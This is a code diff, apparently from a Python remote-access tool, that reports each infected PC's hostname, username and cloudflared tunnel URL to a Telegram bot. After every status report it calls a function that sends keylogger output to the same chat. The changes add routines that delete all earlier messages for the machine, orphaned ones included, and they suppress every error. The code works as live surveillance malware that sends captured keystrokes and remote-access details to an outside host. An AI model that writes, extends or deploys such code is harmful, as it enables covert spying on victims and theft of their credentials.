@@ -412,26 +412,61 @@ def _delete_telegram_message(message_id: str) -> bool:
     except:
         return False
 
-def _send_telegram_full_report(cloudflared_url: str) -> bool:
-    """Send PC status message on Telegram. Deletes old message, sends fresh one each time."""
+def _cleanup_old_telegram_messages():
+    """Delete ALL previous messages for this PC from Telegram chat, including orphaned ones from crashes."""
+    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN.startswith("BUILD_") or not TELEGRAM_CHAT_ID:
+        return
+    state = _load_telegram_state()
+    pc_data = state.get(_PC_ID, {})
+    all_msg_ids = pc_data.get("all_message_ids", [])
+    last_msg_id = pc_data.get("message_id", "")
+    if last_msg_id and last_msg_id not in all_msg_ids:
+        all_msg_ids.append(last_msg_id)
+    for mid in all_msg_ids:
+        _delete_telegram_message(str(mid))
     try:
-        state = _load_telegram_state()
-        pc_data = state.get(_PC_ID, {})
-        old_msg_id = pc_data.get("message_id", "")
-        if old_msg_id:
-            _delete_telegram_message(old_msg_id)
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
+        params = {"limit": 100, "allowed_updates": ["message"]}
+        resp = requests.get(url, params=params, timeout=15)
+        if resp.status_code == 200:
+            updates = resp.json().get("result", [])
+            hostname = socket.gethostname()
+            username = os.environ.get('USERNAME', '')
+            for update in updates:
+                msg = update.get("message", {})
+                chat_id = str(msg.get("chat", {}).get("id", ""))
+                if chat_id != str(TELEGRAM_CHAT_ID):
+                    continue
+                text = msg.get("text", "")
+                if not text:
+                    continue
+                if hostname in text or (username and username in text):
+                    orphan_id = str(msg.get("message_id", ""))
+                    if orphan_id and orphan_id not in all_msg_ids:
+                        _delete_telegram_message(orphan_id)
+                        all_msg_ids.append(orphan_id)
+    except:
+        pass
+    state[_PC_ID] = {"message_id": "", "all_message_ids": [], "last_seen": datetime.now().isoformat(), "status": "cleaned"}
+    _save_telegram_state(state)
 
+def _send_telegram_full_report(cloudflared_url: str) -> bool:
+    """Send PC status message on Telegram. Cleans up ALL old messages from this host first (handles crash duplicates)."""
+    try:
+        _cleanup_old_telegram_messages()
         msg_text = _build_pc_status_text(cloudflared_url, "\U0001f7e2 Active")
         msg_id = _send_telegram_get_id(msg_text)
         if msg_id:
+            state = _load_telegram_state()
             state[_PC_ID] = {
                 "message_id": msg_id,
-                "last_seen": datetime.now().isoformat()
+                "all_message_ids": [msg_id],
+                "last_seen": datetime.now().isoformat(),
+                "status": "active"
             }
             _save_telegram_state(state)
             _send_keylog_to_telegram()
             return True
-
         return _send_telegram(msg_text)
     except:
         return False
@@ -446,18 +481,25 @@ def _send_keylog_to_telegram():
         pass
 
 def _telegram_mark_offline():
-    """Delete the PC's Telegram status message to show offline."""
+    """Delete ALL of this PC's Telegram messages and send a single Offline message."""
     try:
         state = _load_telegram_state()
         pc_data = state.get(_PC_ID, {})
         msg_id = pc_data.get("message_id", "")
-        if not msg_id:
-            return
-        _delete_telegram_message(msg_id)
+        all_msg_ids = pc_data.get("all_message_ids", [])
+        if msg_id:
+            _delete_telegram_message(msg_id)
+        for mid in all_msg_ids:
+            if str(mid) != str(msg_id):
+                _delete_telegram_message(str(mid))
         now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        _send_telegram(f"\U0001f534 Offline | {socket.gethostname()}\nUser: {os.environ.get('USERNAME', 'Unknown')}\nLast Seen: {now_str}")
-        state[_PC_ID]["status"] = "offline"
-        state[_PC_ID]["last_seen"] = datetime.now().isoformat()
+        offline_msg_id = _send_telegram_get_id(f"\U0001f534 Offline | {socket.gethostname()}\nUser: {os.environ.get('USERNAME', 'Unknown')}\nLast Seen: {now_str}")
+        state[_PC_ID] = {
+            "message_id": offline_msg_id or "",
+            "all_message_ids": [offline_msg_id] if offline_msg_id else [],
+            "status": "offline",
+            "last_seen": datetime.now().isoformat()
+        }
         _save_telegram_state(state)
     except:
         pass
@@ -1053,14 +1095,20 @@ def _telegram_heartbeat(cloudflared_url: str):
             state = _load_telegram_state()
             pc_data = state.get(_PC_ID, {})
             old_msg_id = pc_data.get("message_id", "")
+            all_msg_ids = pc_data.get("all_message_ids", [])
             if old_msg_id:
                 _delete_telegram_message(old_msg_id)
+            for mid in all_msg_ids:
+                if str(mid) != str(old_msg_id):
+                    _delete_telegram_message(str(mid))
             msg_text = _build_pc_status_text(cloudflared_url, "\U0001f7e2 Active")
             new_msg_id = _send_telegram_get_id(msg_text)
             if new_msg_id:
                 state[_PC_ID] = {
                     "message_id": new_msg_id,
-                    "last_seen": datetime.now().isoformat()
+                    "all_message_ids": [new_msg_id],
+                    "last_seen": datetime.now().isoformat(),
+                    "status": "active"
                 }
                 _save_telegram_state(state)
         except:
